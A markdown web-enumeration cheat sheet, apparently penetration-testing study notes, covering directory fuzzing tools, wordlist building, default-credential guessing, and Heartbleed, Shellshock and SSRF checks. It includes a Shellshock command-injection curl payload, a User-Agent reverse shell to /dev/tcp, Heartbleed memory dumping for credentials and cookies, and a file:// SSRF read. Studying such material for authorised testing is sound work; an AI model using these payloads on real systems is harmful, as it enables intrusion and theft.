# Web Enum Quick Reference  
## Contents 
- [Web Enum Quick Reference](#web-enum-quick-reference)
  * [Contents](#contents)
  * [HTTP and HTTPS Checklist](#http-and-https-checklist)
  * [Scan for sub directories and pages](#scan-for-sub-directories-and-pages)
    + [Wordlists](#wordlists)
    + [Scanning Tools](#scanning-tools)
    + [Curl](#curl)
- [Web app specific](#web-app-specific)
- [Login pages](#login-pages)
- [Shellshock and Heartbleed](#shellshock-and-heartbleed)
  * [Heartbleed](#heartbleed)
  * [Shellshock](#shellshock)
- [SSRF](#ssrf)
- [Resources](#resources)
  * [Cheat Sheets](#cheat-sheets)
  * [Further Reading](#further-reading)
  * [Sources](#sources)

## HTTP and HTTPS Checklist   
- [ ] Scan page with Wappanalyzer  
- [ ] Scan for sub directories and pages - admin pages?, login pages?, file upload?, user input fields?   
- [ ] Check for a robots.txt page    
- [ ] Test strength of encryption using nmap ssl-enum-ciphers script   
- [ ] Look for service name and version - searchsploit / google for exploits   
- [ ] Service specific scanners: wpscan, sqlmap     
- [ ] Admin page - access misconfigs, login?       
- [ ] Log in pages - guess default creds, admin:admin, admin:password   
- [ ] File upload pages - what types of files are accepted?, what checks are being implemented? is there a value you can change to include a file?     
- [ ] User input fields: SQL injection, cross site scripting   
- [ ] Intercept HTTP requests with Burp and examine    	

Reference: [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings)    
[Wappanalyzer](https://addons.mozilla.org/en-US/firefox/addon/wappalyzer/), [Foxy Proxy](https://addons.mozilla.org/en-US/firefox/addon/foxyproxy-standard/) and [user agent switcher](https://addons.mozilla.org/en-US/firefox/addon/uaswitcher/) Firefox extensions     
[Pen Testing Web Checklist](https://pentestbook.six2dez.com/others/web-checklist)    
## Scan for sub directories and pages	
### Wordlists 
Common wordlists to use for web directory scanning: 

    /usr/share/wordlists/dirb/common.txt
    /usr/share/wordlists/dirbuster/*.txt
    /usr/share/wordlists/wfuzz/general/*.txt
    /usr/share/seclists/Discovery/Web-Content/

Common wordlists to use for user enumeration scanning: 

    /usr/share/seclists/Usernames
    /usr/share/wordlists/dirbuster/apache-user-enum-2.0  
    
Create a wordlist with CeWL:   

    cewl http://www.site.org -w wordlist.txt    

CeWL sometimes misses directories so use these steps to create a dir list for CeWL to crawl:     

    feroxbuster -eknr --wordlist /usr/share/seclists/Discovery/Web-Content/big.txt -u http://10.10.10.10 -o ferox.txt   
    cat ferox.txt | grep 200 | grep -v "png\|\.js" | cut -d "h" -f2-100 | sed "s/^/h/g" >> urls.txt          
    for url in $(cat urls.txt); do echo $url && cewl -d 5 $url >> temp_cewl.txt;done           
    cat temp_cewl.txt | sort -u >> cewl.txt && rm temp_cewl.txt    
    tr '[:upper:]' '[:lower:]' < cewl.txt > cewl_lower.txt
    cat cewl_lower.txt >> cewl.txt
    #then use the CeWL wordlist for password guessing   
    
### Scanning Tools
Web Scanning:     

    nikto -h http://127.0.0.1:80/     
Page and Directory Fuzzing:    

    dirb http://127.0.0.1/   (default word list: common.txt)     
    gobuster dir -u http://127.0.0.1/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -e -k -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp" -z     
    ffuf -w wordlist.txt -u https://example.org/FUZZ -mc all -c -v  
    ffuf -w wordlist.txt -u http://www.site.org/FUZZ -e .aspx,.html,.php,.txt    
    feroxbuster -u http://target.com -w /usr/share/dirb/wordlists/common.txt -d [recursion depth] -t [threads] -s [status codes] 

    whatweb http://target  
    wfuzz -c --hc=404 -R 2 -w /usr/share/dirb/wordlists/common.txt http://target/fuzz   
    
 Virtual Hosts (subdomains):   
 
    gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://site.com --append-domain             
    
### Curl 

    curl -v -X OPTIONS http://<targetip>/test/  
    curl --upload-file <file name> -v --url <url> -0 --http1.0
    
Other Tools: 
    Burp Suite 
    OWASP Zap 
    Cadaver 
    SQLMap 
    Joomscan 
    Feroxbuster	 
    
	
# Web app specific  
See [CMS.md](https://github.com/lw8192/Red-Team-Rising/blob/main/Web/CMS.md)        

# Login pages   
	
Default creds - admin: admin, admin:password, service specific default creds   
Register a new user  
Brute force log in [use hydra or Burp Suite](https://github.com/lw8192/Red-Team-Rising/blob/main/Exploitation/Cracking.md)    
SQL injection  

# Shellshock and Heartbleed    
## Heartbleed   
Testing: scan using nmap heartbleed script   

    nmap -p 443 -sV --script ssl-heartbleed www.site.org    
Example: Exploit the Heartbleed vulnerability to steal the following from a vulnerable OpenSSL server's RAM: Username, Password, Cookie     
RAM is unpredictable, so you may need to run heartbleed.py multiple times. Must use Firefox / HTTPS to browse to site, perform 2 logins - first login will be in RAM.    
https://gist.github.com/eelsivart/10174134     
Save a local copy of the RAM contents that are disclosed via heartbleed. By default, heartbleed.py will write dump.bin to the current directory.    

    heartbleed.py -f /home/user/dump.bin heartbleed.site.org | less     
    strings /home/student/dump.bin    -> look for creds / cookie    

## Shellshock   
Metasploit module or 34900.py ("Apache mod_cgi - 'Shellshock' Remote Command Injection")   
Bug in Bash shell itself incorrectly executing trailing commands when it imports a function definition stored in an enviroment variable. Commonly found in CGI-based webservers, which use user input to define enviromental variables.     
Syntax: () { :; }   
Manual test for CGI based webservers: 
    
    curl -x http://192.168.90.61:3128 -A "() { ignored; }; echo Content-Type: text/plain ; echo  ; echo ; /usr/bin/id" -L http://10.10.10.10/cgi-bin/status
Nmap script check:   

    nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/user.sh 10.10.10.10   
To exploit change vulnerable field in HTTP request (likely UAS) to a reverse shell command:        
    
    User-Agent: () { :;}; /bin/bash -i >& /dev/tcp/10.10.10.10/4444 0>&1    


# SSRF   
Server requests resource of behalf of the web client.    
SSRF example using curl:    

    curl -v "https://site.org/get.php?logo=file://etc/hosts"    #local file reference   
	
# Resources  

## Cheat Sheets 
[SQLi cheat sheet](https://guif.re/sqli)  
[OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/Glossary.html)    
https://websec.ca/kb/sql_injection   
https://pentestmonkey.net/category/cheat-sheet/sql-injection   
https://sqlwiki.netspi.com/    
https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/    

## Further Reading 
[OWASP Web App Testing Guide](https://owasp.org/www-project-web-security-testing-guide/stable/)    
[Bypassing File Upload Restrictions ](http://www.securityidiots.com/Web-Pentest/hacking-website-by-shell-uploading.html)      
[Web vulnerabilities to gain access to the system - paper](https://www.exploit-db.com/papers/13017/)     

File Inclusion
[RFI to LFI](https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1) 

Basic SQLi 
http://www.securityidiots.com/Web-Pentest/SQL-Injection/Part-1-Basic-of-SQL-for-SQLi.html     
http://www.securityidiots.com/Web-Pentest/SQL-Injection/Part-2-Basic-of-SQL-for-SQLi.html       
http://www.securityidiots.com/Web-Pentest/SQL-Injection/Part-3-Basic-of-SQL-for-SQLi.html      
http://www.sqlinjection.net/login/    

## Sources 
https://fareedfauzi.gitbook.io/ctf-checklist-for-beginner/web 
